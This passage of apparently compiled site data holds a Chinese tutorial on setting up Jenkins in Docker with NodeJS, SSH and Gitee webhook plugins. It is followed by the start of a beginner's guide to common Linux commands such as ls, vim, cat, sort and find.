创建用户\n\nTIP\n\n启动后安装插件建议安装推荐\n\n\n\n> 这里由于网络的原因，可能会出现部分失败。点击重试就好了。或者构建成功后可自行安装。\n\n\n\n> 插件安装后会跳到创建用户名，密码 邮箱等信息。\n\n\n# 配置 nodejs ssh gitee 插件。\n\n * nodejs 为了我们构建前端项目。\n * ssh 方便打包后连接服务器进行一些操作。\n * gitee 插件方便使用webhooks 触发自动化部署。（这里我的代码存放在gitee，可自行安装其他插件）\n\n\n# nodejs安装\n\n> 进入系统管理->插件管理->选择可选插件-> 搜索nodejs 直接安装即可。\n\n\n\n\n# 配置nodejs\n\n> 进入系统管理->全局工具配置->选择可选插件-> 搜索nodejs 直接安装即可。\n\n\n\nTIP\n\nnode 的版本建议安装官网的长期支持版本，避免出现其他意料之外的问题\n\n\n# ssh安装\n\n> 进入系统管理->插件管理->选择可选插件-> 搜索Publish Over SSH直接安装即可。\n\n\n\nTIP\n\n安装和node一样，上图为已安装后的示例。\n\n\n# ssh配置\n\n> 进入系统管理->系统配置->选择Publish over SSH-> 填写自己服务器的主机名 ip 等信息。-> 保存信息\n\n\n\n\n# gitee安装\n\n> 安装过程同上。\n\n\n# gitee配置密钥\n\n> 进入系统管理->系统配置->选择gitee-> 填写自己gitee密钥。-> 保存信息\n\n * 参考https://gitee.com/help/articles/4193#article-header0\n\n * 获取gitee密钥\n\n * 在 Connection name 中输入 Gitee 或者你想要的名字\n\n * Gitee host URL 中输入 Gitee 完整 URL地址： https://gitee.com （Gitee 私有化客户输入部署的域名）\n\n * Credentials 中如还未配置 Gitee APIV5 私人令牌，点击 Add - > Jenkins\n\n * Domain 选择 Global credentials\n\n * Kind 选择 Gitee API Token\n\n * Scope 选择你需要的范围\n\n * Gitee API Token 输入你的 Gitee 私人令牌，获取地址：https://gitee.com/profile/personal_access_tokens\n\n * ID, Descripiton 中输入你想要的 ID 和描述即可。\n\n * Credentials 选择配置好的 Gitee APIV5 Token\n\n * 点击 Advanced ，可配置是否忽略 SSL 错误（视您的Jenkins环境是否支持），并可设置链接测超时时间（视您的网络环境而定）\n\n * 点击 Test Connection 测试链接是否成功，如失败请检查以上 3，5，6 步骤。\n\nTIP\n\n使用gitee 是为了配合webhooks 使用，如果你打算手动构建项目或者定时发布项目，个人感觉可以不配置gitee\n\n\n# 新建任务\n\n> 点击主界面左侧的 新建任务，选择 构建一个自由风格的软件项目，填写任务名字。\n\nTIP\n\n创建工程后会直接进入配置页面，按照自己的需求配置（如下图） 基本选项就可以成功构建项目了。\n\n\n\n\n\n\n\nTIP\n\n上图的配置中gitee webhook 的连接地址要放入gittee 的配置中。如下图\n\nGitee WebHook 密码可不填 也可自动生成或自定义 复制到下图的WebHook 密码中即可。\n\n\n\n\n\nTIP\n\n上图我们把已经配置好的node 环境版本选上，并执行shell脚本。\n\n\n\nTIP\n\n最后直接保存构建 或者 gitee push 代码测试一下。\n\n",normalizedContent:"# jenkins\n\n\n\n> jenkins是一款开源 ci&cd 软件，用于自动化各种任务，包括构建、测试和部署软件。 jenkins 支持各种运行方式，可通过系统包、docker 或者通过一个独立的 java 程序。\n\n\n# jenkins 主要作用\n\n * l 持续、自动地构建/测试软件项目。\n * l 监控一些定时执行的任务。\n\n\n# jenkins 安装\n\n\n# 机器要求：\n\n * 256 mb 内存，建议大于 512 mb\n * 10 gb 的硬盘空间（用于 jenkins 和 docker 镜像）\n\n\n# 需要安装以下软件：\n\n * java 8 ( jre 或者 jdk 都可以)\n * docker dockerhub\n\n\n# 基于docker 安装并启动\n\ndocker命令\n\njenkins/jenkins:lts 这个版本是长期维护的。\n\n安装docker后直接运行此命令即可，没有安装镜像会自动安装并启动。\n\n卷挂载的/home/datajenkins 可自定义\n\njenkins的配置目录默认在 /var/jenkins_home\n\n暴露jenkins默认8080端口给宿主机\n\n\n\n \n\n\n\n\ndocker run -id --name jenkins -p 8080:8080 -v /home/data/jenkins:/var/jenkins_home jenkins/jenkins:lts\n\n\n\n> 如果发现jenkins 镜像未启动，但是以存在。可能是文件权限的问题 chown -r 1000 /home/data/jenkins\n\n\n# jenkins 配置\n\n\n\ntip\n\n此时 docker 的 jenkins 的镜像已经启动。\n\n可以访问 一下8080端口测试一下。\n\n> 使用docker logs jenkins 或 进入jenkins 镜像的目录中 查看下图路径。 cat /var/lib/jenkins/secrets/initialadminpassword\n\n\n\n\n\n\n# 安装插件 并 创建用户\n\ntip\n\n启动后安装插件建议安装推荐\n\n\n\n> 这里由于网络的原因，可能会出现部分失败。点击重试就好了。或者构建成功后可自行安装。\n\n\n\n> 插件安装后会跳到创建用户名，密码 邮箱等信息。\n\n\n# 配置 nodejs ssh gitee 插件。\n\n * nodejs 为了我们构建前端项目。\n * ssh 方便打包后连接服务器进行一些操作。\n * gitee 插件方便使用webhooks 触发自动化部署。（这里我的代码存放在gitee，可自行安装其他插件）\n\n\n# nodejs安装\n\n> 进入系统管理->插件管理->选择可选插件-> 搜索nodejs 直接安装即可。\n\n\n\n\n# 配置nodejs\n\n> 进入系统管理->全局工具配置->选择可选插件-> 搜索nodejs 直接安装即可。\n\n\n\ntip\n\nnode 的版本建议安装官网的长期支持版本，避免出现其他意料之外的问题\n\n\n# ssh安装\n\n> 进入系统管理->插件管理->选择可选插件-> 搜索publish over ssh直接安装即可。\n\n\n\ntip\n\n安装和node一样，上图为已安装后的示例。\n\n\n# ssh配置\n\n> 进入系统管理->系统配置->选择publish over ssh-> 填写自己服务器的主机名 ip 等信息。-> 保存信息\n\n\n\n\n# gitee安装\n\n> 安装过程同上。\n\n\n# gitee配置密钥\n\n> 进入系统管理->系统配置->选择gitee-> 填写自己gitee密钥。-> 保存信息\n\n * 参考https://gitee.com/help/articles/4193#article-header0\n\n * 获取gitee密钥\n\n * 在 connection name 中输入 gitee 或者你想要的名字\n\n * gitee host url 中输入 gitee 完整 url地址： https://gitee.com （gitee 私有化客户输入部署的域名）\n\n * credentials 中如还未配置 gitee apiv5 私人令牌，点击 add - > jenkins\n\n * domain 选择 global credentials\n\n * kind 选择 gitee api token\n\n * scope 选择你需要的范围\n\n * gitee api token 输入你的 gitee 私人令牌，获取地址：https://gitee.com/profile/personal_access_tokens\n\n * id, descripiton 中输入你想要的 id 和描述即可。\n\n * credentials 选择配置好的 gitee apiv5 token\n\n * 点击 advanced ，可配置是否忽略 ssl 错误（视您的jenkins环境是否支持），并可设置链接测超时时间（视您的网络环境而定）\n\n * 点击 test connection 测试链接是否成功，如失败请检查以上 3，5，6 步骤。\n\ntip\n\n使用gitee 是为了配合webhooks 使用，如果你打算手动构建项目或者定时发布项目，个人感觉可以不配置gitee\n\n\n# 新建任务\n\n> 点击主界面左侧的 新建任务，选择 构建一个自由风格的软件项目，填写任务名字。\n\ntip\n\n创建工程后会直接进入配置页面，按照自己的需求配置（如下图） 基本选项就可以成功构建项目了。\n\n\n\n\n\n\n\ntip\n\n上图的配置中gitee webhook 的连接地址要放入gittee 的配置中。如下图\n\ngitee webhook 密码可不填 也可自动生成或自定义 复制到下图的webhook 密码中即可。\n\n\n\n\n\ntip\n\n上图我们把已经配置好的node 环境版本选上，并执行shell脚本。\n\n\n\ntip\n\n最后直接保存构建 或者 gitee push 代码测试一下。\n\n",charsets:{cjk:!0}},{title:"Linxu简单命令学习",frontmatter:{},regularPath:"/Linux/",relativePath:"Linux/README.md",key:"v-08f38c1c",path:"/Linux/",headers:[{level:2,title:"命令",slug:"命令",normalizedTitle:"命令",charIndex:9},{level:3,title:"Linux命令行",slug:"linux命令行",normalizedTitle:"linux命令行",charIndex:219},{level:3,title:"Linux 提示符",slug:"linux-提示符",normalizedTitle:"linux 提示符",charIndex:654},{level:3,title:"Linux 文件及目录管理命令",slug:"linux-文件及目录管理命令",normalizedTitle:"linux 文件及目录管理命令",charIndex:897},{level:3,title:"vim命令",slug:"vim命令",normalizedTitle:"vim命令",charIndex:3424},{level:3,title:"重定向符号",slug:"重定向符号",normalizedTitle:"重定向符号",charIndex:5006},{level:3,title:"cat命令",slug:"cat命令",normalizedTitle:"cat命令",charIndex:5016},{level:3,title:"tac命令",slug:"tac命令",normalizedTitle:"tac命令",charIndex:5689},{level:3,title:"管道符",slug:"管道符",normalizedTitle:"管道符",charIndex:5722},{level:3,title:"more命令",slug:"more命令",normalizedTitle:"more命令",charIndex:5906},{level:3,title:"less命令",slug:"less命令",normalizedTitle:"less命令",charIndex:6090},{level:3,title:"head命令",slug:"head命令",normalizedTitle:"head命令",charIndex:6248},{level:3,title:"tail命令",slug:"tail命令",normalizedTitle:"tail命令",charIndex:6787},{level:3,title:"cut命令",slug:"cut命令",normalizedTitle:"cut命令",charIndex:7084},{level:3,title:"sort命令",slug:"sort命令",normalizedTitle:"sort命令",charIndex:7448},{level:3,title:"uniq命令",slug:"uniq命令",normalizedTitle:"uniq命令",charIndex:7848},{level:3,title:"wc命令",slug:"wc命令",normalizedTitle:"wc命令",charIndex:8116},{level:3,title:"tr命令",slug:"tr命令",normalizedTitle:"tr命令",charIndex:8257},{level:3,title:"stat命令",slug:"stat命令",normalizedTitle:"stat命令",charIndex:8601},{level:3,title:"find命令",slug:"find命令",normalizedTitle:"find命令",charIndex:10219},{level:3,title:"xargs命令",slug:"xargs命令",normalizedTitle:"xargs命令",charIndex:13298},{level:3,title:"file命令",slug:"file命令",normalizedTitle:"file命令",charIndex:14835},{level:3,title:"which",slug:"which",normalizedTitle:"which",charIndex:15477},{level:3,title:"whereis命令",slug:"whereis命令",normalizedTitle:"whereis命令",charIndex:15575},{level:3,title:"tar命令",slug:"tar命令",normalizedTitle:"tar命令",charIndex:15826},{level:3,title:"gzip命令",slug:"gzip命令",normalizedTitle:"gzip命令",charIndex:16655},{level:3,title:"zip命令",slug:"zip命令",normalizedTitle:"zip命令",charIndex:16656},{level:3,title:"date命令",slug:"date命令",normalizedTitle:"date命令",charIndex:20820},{level:2,title:"虚拟机的ip配置",slug:"虚拟机的ip配置",normalizedTitle:"虚拟机的ip配置",charIndex:23948},{level:3,title:"shred命令",slug:"shred命令",normalizedTitle:"shred命令",charIndex:24819},{level:3,title:"修改宝塔面板的登录提示",slug:"修改宝塔面板的登录提示",normalizedTitle:"修改宝塔面板的登录提示",charIndex:25120}],headersStr:"命令 Linux命令行 Linux 提示符 Linux 文件及目录管理命令 vim命令 重定向符号 cat命令 tac命令 管道符 more命令 less命令 head命令 tail命令 cut命令 sort命令 uniq命令 wc命令 tr命令 stat命令 find命令 xargs命令 file命令 which whereis命令 tar命令 gzip命令 zip命令 date命令 虚拟机的ip配置 shred命令 修改宝塔面板的登录提示",content:'# Linxu简单命令学习\n\n\n# 命令\n\nshutdown -h now//正常关机\nhalt //关闭内存\ninit 0 //\nlogout //退出登录\n \n\nls //查看当前的文件\n    白色的为普通文件 --  蓝色为文件夹\npwd 为当前的文件路径\n\ntouch 新建文件\nvim /etc/motd  //修改登录界面\ncd /etc/os-release  //查看系统呃版本号\nsu lwz 用户切换\n\n\n\n\n\n# Linux命令行\n\n命令           空格   参数（可写可不写）              空格   文件，文件夹\nls列出文件夹的内容                                    /data 根目录下的data文件夹\nls                -a all 列出所有的文件以及隐藏文件        /data\nls                -a                          如果不写输入当前的文件\nls                                            输入当前的文件\nls                -a                          -l 查询更详细的文件\n\n> 基本的命令如上\n\n * 一般情况下，linux命令的参数都是可选的，可写可不写，不同的参数作用也不一样。\n * Linux 命令行之间，必须得有多个空格。\n\n\n# Linux 提示符\n\n * whoami 我是谁，显示当前的用户\n * hostname 显示当前的主机名\n * pwd 显示当前的路径\n * \n\n命令提示符\n[py@pylinux ~]$            普通用户py，登陆后\n\n[root@pylinux ~]#        超级用户root，登录后\n\nroot代表当前登录的用户\n\n@ 分隔符\n\npylinux 主机名\n\n~  当前的登录的位置，此时是家目录\n\n# 超级用户身份提示符\n$ 普通用户身份提示符\n\n\n\n\n# Linux 文件及目录管理命令\n\n命令         作用\ncat        查看文件\nvim        打开文件\ni          插入编辑\n:wq!       强制保存并退出\n:q!        强制退出不保存\n:wq        保存并退出\ncd 目录名     切换文件夹\ntouch文件名   如果文件不存在就创建文件\nmkdir目录名   创建目录\nrm         文件名\n\n# cd 命令 变换目录\n\n * . 当前目录\n * .. 上一层目录\n * * 前一个工作目录\n * ~ 当前用户所在的家的目录\n * / 顶级根目录\n * \n\n# ls 命令\n\n * -a 显示指定目录下所有子目录与文件，包括以.开头的隐藏文件\n\n * -l 以列表方式显示文件的详细信息 ls -l 等于ll 用法\n\n * -h, --human-readable 与-l 一起，以易于阅读的格式输出文件大小 (例如 1K 234M 2G)\n\n * -t 根据最后修改时间排序，默认是以文件名排序，通常与-l 连用\n\n * -F 在条目后加上文件类型的指示符号(* ， /， = ， @ ， | ，其中的一个)\n   \n   * 注:可以标识文件类型\n   * 加上 * 代表可执行的普通文件\n   * 加上 = 表示套接字\n   * 加上 | 表示FIFOS(队列系统)\n   * 加上 @表示符号链接\n   * 加上 / 表示文件夹\n\n * -d 显示目录本身的信息 而不是显示目录的内容\n\n * -r, --reverse 逆序排列\n\n * -S 根据文件大小排序,从大到小排序\n\n * -i 显示索引节点信息(索引节点相当于身份证号)\n\n * --full-time 以完整的时间格式输出(也就是按照中国的时间日期显示)\n\n# mkdir命令\n\n> 创建文件夹\n\n * 用法：mkdir [选项]... 目录...\n\n * 若指定目录不存在则创建目录。\n\n * -m, --mode=模式 设置权限模式(类似chmod)，而不是rwxrwxrwx 减umask\n\n * -p, --parents 需要时创建目标目录的上层目录，但即使这些目录已存在也不当作错误处理\n\n * mkdir {1..3}加花括号创建连续的目录，用..隔开 花括号内可以是连续的数字、连续的字母mkdir {a..e}\n\n# touch命令\n\n> 创建文件或修改文件时间戳\n\n用法：touch [选项]... 文件...\n将每个文件的访问时间和修改时间改为当前时间。\n\n不存在的文件将会被创建为空文件，除非使用-c 或-h 选项。\n\ntouch {连续数字或字母} 创建多个文件序列\ntouch {1..10}创建文件或修改文件时间戳\n\ntouch {a..z}\n\n  -c, --no-create       不创建任何文件\n  -t STAMP              使用[[CC]YY]MMDDhhmm[.ss] 格式的时间替代当前时间\n  -r, --reference=文件  使用指定文件的时间属性替代当前文件时间\n\n\n\n# cp复制\n\n\n用法：cp [选项]... [-T] 源文件 目标文件\n　或：cp [选项]... 源文件... 目录\n　或：cp [选项]... -t 目录 源文件...\n将源文件复制至目标文件，或将多个源文件复制至目标目录。\n\n-r 递归式复制目录，即复制目录下的所有层级的子目录及文件 -p 复制的时候 保持属性不变\n-d 复制的时候保持软连接(快捷方式)\n-a 等于-pdr\n-p                等于--preserve=模式,所有权,时间戳，复制文件时保持源文件的权限、时间属性\n-i, --interactive        覆盖前询问提示\n\n\n# mv命令\n\n\nmv命令就是move的缩写，作用是移动或是重命名文件\n\n用法：mv [选项]... [-T] 源文件 目标文件\n　或：mv [选项]... 源文件... 目录\n　或：mv [选项]... -t 目录 源文件...\n将源文件重命名为目标文件，或将源文件移动至指定目录。\n\n-f, --force                  覆盖前不询问\n-i, --interactive            覆盖前询问\n-n, --no-clobber             不覆盖已存在文件如果您指定了-i、-f、-n 中的多个，仅最后一个生效。\n-t, --target-directory=DIRECTORY      将所有参数指定的源文件或目录移动至 指定目录\n-u, --update                  只在源文件文件比目标文件新，或目标文件不存在时才进行移动\n\n\n\n# rm 命令\n\n用法：rm [选项]... 文件...\n删除 (unlink) 文件。\n\nrm命令就是remove的含义，删除一个或者多个文件，这是Linux系统重要命令\n-f, --force           强制删除。忽略不存在的文件，不提示确认\n-i                    在删除前需要确认\n-I                    在删除超过三个文件或者递归删除前要求确认。\n-d, --dir    删除空目录\n-r, -R, --recursive   递归删除目录及其内容\n-v, --verbose         详细显示进行的步骤\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n       \n\n\n\n# Linux帮助命令\n\n语法\nman 命令  \n\n如：\nman  ls  \n\n进入man帮助文档后，按下q退出\n\n\n语法：\n命令 --help\n\n帮助命令的精简版\n如 ls --help\n\n\n语法：\nhelp  命令  \n\n只针对bash内置命令\n\n\n语法：\ninfo 命令\n\n\n\n# vim命令\n\n# vim基础用法\n\n * vi oldboy.txt #打开文件\n * 打开后无法直接编辑，需要按 i 进入编辑模式\n * 修改这个文件内容吧\n * 修改完后，按 esc 退出编辑模式:wq\n * 保存退出 #注意":"必须是英文符号 :wq 保存并退出 :q! 强制退出不保存 :wq! 强制保存退出\n\n# 移动光标\n\nw(e)　　移动光标到下一个单词\nb　　　　移动到光标上一个单词\n\n数字0　　移动到本行开头\n$　　　　移动光标到本行结尾\n\nH　　　　移动光标到屏幕首行\nM　　　　移动到光标到屏幕的中间一行\nL　　　　移动光标到屏幕的尾行\ngg　　　 移动光标到文档的首行\nG　　　　移动光标到文档尾行\n\nctrl + f　　下一页\nctrl + b　　上一页\n\n`.　　移动光标到上一次的修改行\n\n\n# 查找\n\n/chaoge     在整篇文档中搜索chaoge字符串,向下查找\n?chaoge     在整篇文档中搜索chaoge字符串,向上查找\n\n*        查找整个文档，匹配光标所在的所有单词,按下n查找下一处,N上一处\n#        查找整个文档，匹配光标所在的所有单词,按下n查找下一处,N上一处\n\ngd        找到光标所在单词匹配的单词，并停留在非注释的第一个匹配上\n\n%　　　　找到括号的另一半！！\n\n\n# 复制、删除、粘贴\n\nyy    拷贝光标所在行\ndd    删除光标所在行\nD     删除当前光标到行尾的内容\ndG    删除当前行到文档尾部的内容\np     粘贴yy所复制的内容\nx　　  向后删除字符\nX     先前删除字符\nu     撤销上一步的操作\n.       重复前一个执行过的动作\n\n\n# 数字与命令\n\n3yy　　　　拷贝光标所在的3行\n5dd　　　　删除光标所在5行\n\n\n# 快捷操作\n\n删除光标所在位置到行尾的内容并进入编辑模式 C(大写字母)\n在命令模式下按下字母i，即可进入输入模式，可以编写代码啦。。。\n在当前行下面插入一行并进入编辑模式 o(小写字母)\n在当前行上面插入一行并进入编辑模式 O(大写字母)\n快速到达行尾并进入编辑模式 A\n快速保存并退出 ZZ\n\n\n# 批量快捷操作\n\n批量删除:\n进入批量编辑模式(可视块)\nctrl+v \n选择 上下左右\n删除 d \n\n批量增加:进入批量编辑模式(可视块)ctrl+v\n选择区域\n输入大写的 I 进入编辑模式 编辑\n按下ESC键\n\n批量去掉注释\n1. 进入命令行模式，按ctrl + v进入 visual block模式，按字母l横向选中列的个数，例如 // 需要选中2列\n2. 按字母j，或者k选中注释符号\n3. 按d键就可全部取消注释\n\n\n\n# vim批量缩进\n\n:set tabstop=4 设定tab宽度为4个字符\n:set shiftwidth=4 设定自动缩进为4个字符\n:set expandtab 用space替代tab的输入\n:set noexpandtab 不用space替代tab的输入\n\n1.命令模式，按下v，进入可视模式\n2.光标移动选择行，输入 > 大于号，缩进，输入< 缩进\n\n输入行号缩进：\n1.显示行号\n:set nu        #显示\n:set nonu    #关闭\n\n2.行号缩进\n:10,20 >    #10到20行，缩进一次\n\n\n> 底线命令模式\n\n在命令模式下输入冒号（英文的:），就进入了底线命令模式，在底线命令模式下可以输入单个或多个字符的命令，常用命令有：\n\n:q!     强制退出\n:wq!    强制写入退出\n:set nu 显示行号\n:数字　　调到数字那行\n:set nonu 取消显示行号\n\n随时按下esc可以退出底线命令模式\n\n\n\n# 重定向符号\n\n\n# cat命令\n\n> cat命令用于查看纯文本文件（常用于内容较少的）， 可以理解为是猫，瞄一眼文件内容 其单词是concatenate，指的是可以连接多个文件且打印到屏幕，或是重定向到文件中\n\n用法：cat [选项] [文件]...\n将[文件]或标准输入组合输出到标准输出。\n\n清空文件内容,慎用\n1.直接清空不留空行\n> 文件名\n2.直接清空留下空行\necho > gushi.txt\n3.利用cat读取一个黑洞文件，然后清空其他文本。\n/dev/null  \n\n\n-A, --show-all           等价于 -vET\n-b, --number-nonblank    对非空输出行编号\n-e                       等价于 -vE\n-E, --show-ends          在每行结束处显示 $\n-n, --number             对输出的所有行编号\n-s, --squeeze-blank      不输出多行空行\n-t                       与 -vT 等价\n-T, --show-tabs          将跳格字符显示为 ^I\n-u                       (被忽略)\n-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外\n--help     显示此帮助信息并退出\n--version  输出版本信息并退出\n\n如果[文件]缺省，或者[文件]为 - ，则读取标准输入。\n\n\n\n\n# tac命令\n\n> 与cat命令作用相反，反向读取文件内容\n\n\n# 管道符\n\nLinux提供的管道符“|”讲两条命令隔开，管道符左边命令的输出会作为管道符右边命令的输入。\n常见用法：\n#检查python程序是否启动\nps -ef|grep "python"\n\n#找到/tmp目录下所有txt文件\nls /tmp|grep \'.txt\'\n\n#检查nginx的端口是否存活\nnetstat -tunlp |grep nginx\n\n\n\n\n# more命令\n\n> More是一个过滤器, 用于分页显示 (一次一屏) 文本，以当前屏幕窗口尺寸为准\n\n语法\nmore 参数  文件\n\n-num 指定屏幕显示大小为num行\n+num 从num行开始显示\n\n交互式more的命令：\n空格     向下滚动一屏\nEnter 向下显示一行\n=            显示当前行号\nq            退出\n\n\n\n\n# less命令\n\n> less命令是more的反义词\n\n\n语法：\nless 参数 文件\n\n-N 显示每行编号\n-e 到文件结尾自动退出，否则得手动输入q退出\n\n子命令\n\n整个的翻页\nb    向前一页\nf 向后一页\n\n空格    查看下一行，等于 ↓\ny            查看上一行，等于↑\n\nq退出\n\n\n\n# head命令\n\n> 用于显示文件内容头部，默认显示开头10行\n\n用法：head [选项]... [文件]...\n将每个指定文件的头10 行显示到标准输出。\n如果指定了多于一个文件，在每一段输出前会给出文件名作为文件头。\n如果不指定文件，或者文件为"-"，则从标准输入读取数据。\n\n  -c,  --bytes=[-]K     显示每个文件的前K 字节内容；\n                        如果附加"-"参数，则除了每个文件的最后K字节数据外\n                        显示剩余全部内容\n  -n, --lines=[-]K      显示每个文件的前K 行内容；\n                        如果附加"-"参数，则除了每个文件的最后K 行外显示\n                        剩余全部内容\n  -q, --quiet, --silent 不显示包含给定文件名的文件头\n  -v, --verbose         总是显示包含给定文件名的文件头\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n\n\n\n\n# tail命令\n\n> 显示文件内容的末尾，默认输出后10行\n\n-c 数字                            指定显示的字节数\n-n 行数                            显示指定的行数\n-f                                  实时刷新文件变化\n-F 等于 -f --retry                 不断打开文件，与-f合用\n--pid=进程号                 进程结束后自动退出tail命令\n-s 秒数                            检测文件变化的间隔秒数\n\n\n\n\n# cut命令\n\n> cut - 在文件的每一行中提取片断 在每个文件FILE的各行中, 把提取的片断显示在标准输出。\n\n语法\n\ncut 参数  文件\n\n-b         以字节为单位分割\n-n         取消分割多字节字符，与-b一起用\n-c         以字符为单位\n-d         自定义分隔符，默认以tab为分隔符\n-f         与-d一起使用，指定显示哪个区域\nN       第 N 个 字节, 字符 或 字段, 从 1 计数 起 \nN-       从 第 N 个 字节, 字符 或 字段 直至 行尾 \nN-M     从 第 N 到 第 M (并包括 第M) 个 字节, 字符 或 字段 \n-M       从 第 1 到 第 M (并包括 第M) 个 字节, 字符 或 字段\n\n\n\n# sort命令\n\n> sort命令将输入的文件内容按照规则排序，然后输出结果\n\n用法：sort [选项]... [文件]...\n　或：sort [选项]... --files0-from=F\n串联排序所有指定文件并将结果写到标准输出。\n\n -b, --ignore-leading-blanks   忽略前导的空白区域\n -n, --numeric-sort            根据字符串数值比较\n -r, --reverse                 逆序输出排序结果\n -u, --unique          配合-c，严格校验排序；不配合-c，则只输出一次排序结果\n -t, --field-separator=分隔符  使用指定的分隔符代替非空格到空格的转换\n -k, --key=位置1[,位置2]       在位置1 开始一个key，在位置2 终止(默认为行尾)\n\n\n\n# uniq命令\n\n> uniq命令可以输出或者忽略文件中的重复行，常与sort排序结合使用\n\n用法：uniq [选项]... [文件]\n从输入文件或者标准输入中筛选相邻的匹配行并写入到输出文件或标准输出。\n\n不附加任何选项时匹配行将在首次出现处被合并。\n\n-c, --count           在每行前加上表示相应行目出现次数的前缀编号\n-d, --repeated        只输出重复的行\n-u, --unique          只显示出现过一次的行,注意了，uniq的只出现过一次，是针对-c统计之后的结果\n\n\n\n# wc命令\n\n> wc命令用于统计文件的行数、单词、字节数\n\n-c, --bytes打印字节数\n-m, --chars  打印字符数 \n-l, --lines  打印行数 \n-L, --max-line-length  打印最长行的长度\n-w, --words 打印单词数\n\n\n\n# tr命令\n\n> tr命令从标准输入中替换、缩减或删除字符，将结果写入到标准输出\n\n用法：tr [选项]... SET1 [SET2]\n从标准输入中替换、缩减和/或删除字符，并将结果写到标准输出。\n\n字符集1：指定要转换或删除的原字符集。\n\n当执行转换操作时，必须使用参数“字符集2”指定转换的目标字符集。\n\n但执行删除操作时，不需要参数“字符集2”；\n\n字符集2：指定要转换成的目标字符集。\n\n-c或——complerment：取代所有不属于第一字符集的字符；\n-d或——delete：删除所有属于第一字符集的字符；\n-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；\n-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。\n\n\n\n# stat命令\n\n> stat命令用于显示文件的状态信息。stat命令的输出信息比ls命令的输出信息要更详细。\n\n * stat(选项)(参数)\n\n# 选项\n\n -L, --dereference     跟随链接\n  -f, --file-system     显示文件系统状态而非文件状态\n  -c --format=格式      使用指定输出格式代替默认值，每用一次指定格式换一新行\n      --printf=格式     类似 --format，但是会解释反斜杠转义符，不使用换行作\n                                输出结尾。如果您仍希望使用换行，可以在格式中\n                                加入"\\n"\n  -t, --terse           使用简洁格式输出\n      --help            显示此帮助信息并退出\n      --version         显示版本信息并退出\n\n 有效的文件格式序列(不使用 --file-system)：\n  %a    八进制权限\n\n\n# 参数\n\n> 文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。\n\n[root@www ~]#stat abc.ph\n  文件："abc.ph"\n  大小：0               块：0          IO 块：4096   普通空文件\n设备：801h/2049d        Inode：1200314     硬链接：1\n权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)\n最近访问：2013-05-14 13:24:30.830729223 +0800\n最近更改：2013-05-14 13:24:30.830729223 +0800\n最近改动：2013-05-14 13:24:30.830729223 +0800\n创建时间：-\n\n[root@luffycity tmp]# stat test.txt\n  File: \'test.txt\'\n  Size: 16            Blocks: 8          IO Block: 4096   regular file\nDevice: fd00h/64768d    Inode: 17540200    Links: 1\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nContext: unconfined_u:object_r:user_tmp_t:s0\nAccess: 2019-10-18 14:58:59.465647961 +0800\nModify: 2019-10-18 14:58:57.799636638 +0800\nChange: 2019-10-18 14:58:57.799636638 +0800\n Birth: -\n\n#显示文件权限\n[root@pylinux test_find]# stat -c  %a alex.txt\n644\n\n\n\n# stat的时间戳\n\nAccess: 2019-10-18 14:58:59.465647961 +0800\nModify: 2019-10-18 14:58:57.799636638 +0800\nChange: 2019-10-18 14:58:57.799636638 +0800\n\naccess、最近访问，文件每次被cat之后，时间变化，由于操作系统特性，做了优化，频繁访问，时间不变\nmodify，最近更改，更改文件内容，vim等\nchange，最近改动，文件元数据改变，如文件名\n\n\n\n\n# find命令\n\n> find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。 如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。 并且将查找到的子目录和文件全部进行显示。\n\nfind 查找目录和文件，语法：\n\nfind 路径 -命令参数 [输出形式]\n\n参数说明：\n路径：告诉find在哪儿去找你要的东西，\n\n\n参数                解释\n-pathname         要查找的路径\n# options选项       \n-maxdepth         <目录层级>：设置最大目录层级；\n-mindepth         <目录层级>：设置最小目录层级；\n# tests模块         \n-atime            按照文件访问access的时间查找，单位是天\n-ctime            按照文件的改变change状态来查找文件，单位是天\n-mtime            根据文件修改modify时间查找文件【最常用】\n-name             按照文件名字查找，支持* ? [] 通配符\n-group            按照文件的所属组查找\n-perm             按照文件的权限查找\n-size n[cwbkMG]   按照文件的大小 为 n 个由后缀决定的数据块。其中后缀为：\n                  b: 代表 512 位元组的区块（如果用户没有指定后缀，则默认为 b）\n                  c: 表示字节数\n                  k: 表示 kilo bytes （1024字节）\n                  w: 字 （2字节）\n                  M:兆字节（1048576字节）\n                  G: 千兆字节 （1073741824字节）\n-type 查找某一类型的文件   b - 块设备文件。\n                  d - 目录。\n                  c - 字符设备文件。\n                  p - 管道文件。\n                  l - 符号链接文件。\n                  f - 普通文件。\n                  s -\n-user             按照文件属主来查找文件。\n-path             配合-prune参数排除指定目录\nActions模块         \n-prune            使find命令不在指定的目录寻找\n-delete           删除找出的文件\n-exec 或-ok        对匹配的文件执行相应shell命令\n-print            将匹配的结果标准输出\nOPERATORS         \n! 取反              \n-a -o             取交集、并集，作用类似&&和\\\n\n> UNIX/Linux文件系统每个文件都有三种时间戳：\n\n * 访问时间（-atime/天，-amin/分钟）：用户最近一次访问时间（文件修改了，还未被读取过，则不变）。\n * 修改时间（-mtime/天，-mmin/分钟）：文件最后一次修改时间（数据变动）。\n * 变化时间（-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\n * 文件任何数据改变，change变化，无论是元数据变动，或是对文件mv，cp等\n * 文件内容被修改时，modify和change更新\n * 当change更新后，第一次访问该文件（cat，less等），access time首次会更新，之后则不会\n\n# find根据修改时间查找文件\n\n#一天以内，被访问access过的文件\nfind . -atime -1  \n\n#一天以内，内容变化的文件\nfind . -mtime -1 \n\n#恰好在7天内被访问过的文件\n[root@pylinux home]# find /  -maxdepth 3  -type f -atime 7\n\n\n时间说明\n\n * -atime -2 搜索在2天内被访问过的文件\n * -atime 2 搜索恰好在2天前被访问过的文件\n * -atime +2 超过2天内被访问的文件\n\n# find反向查找\n\n[root@pylinux opt]# find . -maxdepth 1  -type d      #在opt目录下 查找最大目录深度为1 文件夹类型的数据\n\n[root@pylinux opt]# find . -maxdepth 1  ! -type d    # 